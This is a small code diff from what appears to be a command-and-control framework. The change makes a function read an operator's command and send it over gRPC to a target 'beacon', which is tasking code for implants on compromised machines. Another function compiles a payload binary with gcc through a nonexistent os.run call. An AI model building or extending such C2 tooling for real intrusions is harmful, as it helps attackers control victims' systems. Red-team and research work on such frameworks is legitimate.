@@ -50,7 +50,7 @@ def FarmerPickles(PyFileName):
         PYTHONLIBVER = sys.version_info[:2]
         os.run(f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")
 
-def SendCommand(command, beaconID):
+def SendCommand(beaconID):
     '''
     This uses gRPC to talk with the C2
     We take the command to run and the beaconID to update and write it to the beacons file
@@ -59,6 +59,10 @@ def SendCommand(command, beaconID):
     :param beaconID: The beacon we want to target
     :return: Get the result of the command
     '''
+    command = input("> ")
+    client = UnaryClient()
+    result = client.get_url(message=command, ID=beaconID)
+    print(f'{result}')
 
 if __name__ == '__main__':
     client = UnaryClient()
